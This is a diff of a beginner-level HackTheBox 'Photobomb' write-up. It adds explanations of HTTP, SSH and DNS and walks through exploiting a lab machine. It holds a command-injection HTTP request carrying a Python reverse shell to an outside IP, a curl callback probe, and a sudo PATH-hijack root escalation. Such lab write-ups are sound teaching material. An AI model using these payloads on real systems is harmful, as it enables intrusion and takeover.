@@ -1,5 +1,5 @@
 ---
-draft: true
+draft: false
 title: 'HackTheBox | Photobomb'
 date: "2023-01-17T00:00:00Z"
 tags: [hackthebox,linux,web,python,javascript,misconfiguration,delivery]
@@ -8,10 +8,9 @@ cover:
     image: "/assets/CTFs/HTB/Photobomb/infopanel.jpg"
 ---
 
-***Disclaimer:***
-This writeup will different than you might expect.
-If you are a beginner this is **THE** writeup for you. I will be explaining each thing detail, why we do it and how it works.
-Thank you to Mrs. Dorpel, the **BEST** English teacher for giving me this idea!
+***Disclaimer:*** This writeup will different than you might expect.
+***However,*** If you are a beginner this is the writeup for you. I will be trying to explain each thing detail, why we do it and how it works.
+***Thank you*** to Mrs. van den Dorpel, the **best** English teacher, for giving me this idea!
 
 
 ## Introduction
@@ -50,7 +49,9 @@ This is the most basic nmap command you can run and is nessarsary for this machi
 
 We find only 2 ports. `22` and `80`. Any application can run on a port however port 22 and port 80 most of the time use the default normal application. Port 80 is almost always a HTTP server and port 22 is almost always the SSH server.
 
-#### NOTE: EXPLAIN HTTP SERVER and SSH SERVER HERE
+HTTP is the protocol your browser and website uses to communicate. But there needs to be an application that handles and makes sure your browser can talk to something, this is the HTTP server also known as a webserver. This is an application that handles requests made for HTTP and serves you the webpages you want to access.
+
+SSH is an protocol used to access a computer it's command line remotely. This is often used for easy management among other things. And SSH server then is the application that allows you to connect with SSH and handles these connections.
 
 ## Web-application
 HTTP is the protocol used to access a website in a browser thats why the url always starts with `http://` (or `https://`, however HTTPS is a bit different protocol and will use an other port `443`)
@@ -64,7 +65,9 @@ What happens when use connect like this is that the web-server redirected us to 
 
 How that works we need to learn a bit about DNS.
 
-#### NOTE: EXPLAIN DNS HERE
+Domain Name System (DNS) is the phonebook of the Internet. We access information online through domain names, like google.com. Computers interact through IP addresses. DNS translates domain names to IP addresses.
+
+Normally your computer would ask a nameserver for an ip address. However, if you would need todo this for each request its very bandwidth heavy, thats why often they are also stored in a cache on your computer itself. You computer also has its own little nameserver builtin, this is the HOSTS file. On linux and windows are they stored on different locations. For linux it is `/etc/hosts` and for windows it is `C:\Windows\System32\drivers\etc\hosts`. This HOSTS file is the first place your computer will look for any ip address.
 
 So lets add this to our `/etc/hosts` file *(for linux)*.
 ```yml
@@ -227,8 +230,8 @@ photo=wolfgang-hasselmann-RLEgmd1O7gs-unsplash.jpg&filetype=jpg&dimensions=3000x
 
 This was the request we captured, lets try adding `;curl+myipaddress:9999` (the plus is used instead of a space character) to each of the parameters (photo, filetype, dimensions) one request at a time, eventually we will get a callback like the one below! The parameter field that did the trick was filetype.
 
-The working request was
-#### INCLUDE SCREENSHOT HERE
+The working request was as follows.
+![](/assets/CTFs/HTB/Photobomb/burp-request-callback.png)
 ```http
 POST /printer HTTP/1.1
 Host: photobomb.htb
@@ -277,4 +280,124 @@ export RHOST="myipaddress";export RPORT=8888;python3 -c 'import sys,socket,os,pt
 Now we can start a new netcat listener on the port we entered for RPORT, `8888`. By doing `nc -lnvp 8888`.
 Then we can use the generated payload, but first we replace all spaces with `+`'s. This is the payload we can add behind the text in the filetype parameter.
 
-#### DRAFT DO NOT RELEASE IT AGAIN LEL :)
+```http
+POST /printer HTTP/1.1
+Host: photobomb.htb
+User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://photobomb.htb/printer
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 398
+Origin: http://photobomb.htb
+DNT: 1
+Authorization: Basic cEgwdDA6YjBNYiE=
+Connection: close
+Upgrade-Insecure-Requests: 1
+Cache-Control: max-age=0
+
+photo=wolfgang-hasselmann-RLEgmd1O7gs-unsplash.jpg&filetype=jpg;python3%20-c%20%27import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3Bs.connect%28%28%2210.10.14.137%22%2C8888%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3B%20os.dup2%28s.fileno%28%29%2C1%29%3Bos.dup2%28s.fileno%28%29%2C2%29%3Bimport%20pty%3B%20pty.spawn%28%22sh%22%29%27&dimensions=3000x2000
+```
+
+And our reverse shell has connected.
+
+![](/assets/CTFs/HTB/Photobomb/reverse-shell-callback.png)
+
+Now we can send commands to the other system. Lets try running `id`, and it responded with something
+```bash
+$ id
+# id
+# uid=1000(wizard) gid=1000(wizard) groups=1000(wizard)
+```
+
+Hmm, a bit strange, it returns back what command you send.
+This is because this reverse shell isn't very stable yet, but it does provide us with a starting point.
+There is something you can do to stabilize a reverse shell and this article goes deeper into it [https://jasonturley.xyz/how-to-stabilize-a-reverse-shell/](https://jasonturley.xyz/how-to-stabilize-a-reverse-shell/).
+
+Here are the steps we are going todo.
+```bash
+python3 -c "import pty; pty.spawn('/bin/bash')"
+# CTRL+Z
+stty raw -echo && fg
+export TERM=xterm
+```
+
+Already looks much better doesn't it?
+![](/assets/CTFs/HTB/Photobomb/reverse-shell-stabilize.png)
+
+Ok now we can move around and run commands more freely, how about we get the flag for the user. How do we do that.
+Well the user flag is always stored in a file `user.txt` inside of the home directory of the user.
+
+Printing out the contents of a file to the command line can be done with the `cat` command. Using `cat /home/wizard/user.txt`, we are able to read the contents of that file.
+
+## Privilege Escalation
+
+Now are are the user, but how do we escalate our privileges to be root (administrator).
+We can do this by exploiting some application that already runs as root, or an application that we are able to run as root.
+
+`sudo` is a command that can be used to run a command as root, this can only be done if you are inside a group and know a password. 
+But there also are some other configurations that can be done. Like being able to only run a certain command as root, or run a command without password.
+You can see these configurations by running `sudo -l`.
+
+```bash
+sudo -l
+# Matching Defaults entries for wizard on photobomb:
+#     env_reset, mail_badpass,
+#     secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+# 
+# User wizard may run the following commands on photobomb:
+#     (root) SETENV: NOPASSWD: /opt/cleanup.sh
+```
+
+Looks like we can run `/opt/cleanup.sh` without a password and we can also do a SETENV. SETENV means that we are able to control the **Environment Variables** that the application uses.
+What exactly are **Environment Variables**, These are variables that are part of the environment the application runs. For example, the PATH environment variable stores the locations where the command line will search for a command. Or an application get the value of the TEMP environment variable to check what a suitable location is to store temporary files.
+
+Lets check the contents of the script, maybe there is a way to exploit it.
+```sh
+#!/bin/bash
+. /opt/.bashrc
+cd /home/wizard/photobomb
+
+# clean up log files
+if [ -s log/photobomb.log ] && ! [ -L log/photobomb.log ]
+then
+  /bin/cat log/photobomb.log > log/photobomb.log.old
+  /usr/bin/truncate -s0 log/photobomb.log
+fi
+
+# protect the priceless originals
+find source_images -type f -name '*.jpg' -exec chown root:root {} \;
+```
+
+Immediately we see that find command don't have a path, that means that the command line will check the path variable for what to run.
+This means we are probably able to make our own find command and it will run that instead, if we would add it to the path.
+
+Let's move to `/tmp` and create a file `find`.
+Then we will write `/bin/bash` to the file, this will make our script run bash (the command line), because we run it as root we will be inside a command line as root.
+Then we will have to make this file executable.
+
+We can do these steps by running these commands.
+```bash
+cd /tmp # cd can be used to move to a directory
+touch find # touch is used to create a file
+echo '/bin/bash' > ./find # this writes /bin/bash to the file find in the current directory
+chmod +x ./find # makes the file find executable
+```
+
+![](/assets/CTFs/HTB/Photobomb/privesc-prep.png)
+
+Now exploiting the **Sudo Permissions** and the `/opt/cleanup.sh` script. How do we add our created script to the path so that executes instead?
+We can change a variable for a command by doing `VARIABLE=something COMMAND`, for a command using sudo thats the same we just add sudo in front of that `sudo VARIABLE=something COMMAND`
+In the PATH variable each folder is seperated by a colon `:`, we want to keep our original path as well so how do we prepend our path `/tmp:`.
+Getting the value of a variable is easy, just add a dollar sign `$` in front. So to get the contents of the PATH you can do `$PATH`. Appending and Prepending is just typing it in front or behind it `/tmp:$PATH`, then reassigning it would be `PATH=/tmp:$PATH`. We can now do that for the real command.
+```bash
+sudo PATH=/tmp:$PATH /opt/cleanup.sh
+```
+
+![](/assets/CTFs/HTB/Photobomb/privesc-exploit.png)
+
+And we are root! Reading the root flag is just a fact of reading out the `root.txt` file in its home directory. The home directory for the root user is `/root`. Using `cat /root/root.txt`, we are able to read the contents of that file.
+
+That was all!
+Happy Hacking and a big thanks to Mrs van den Dorpel.
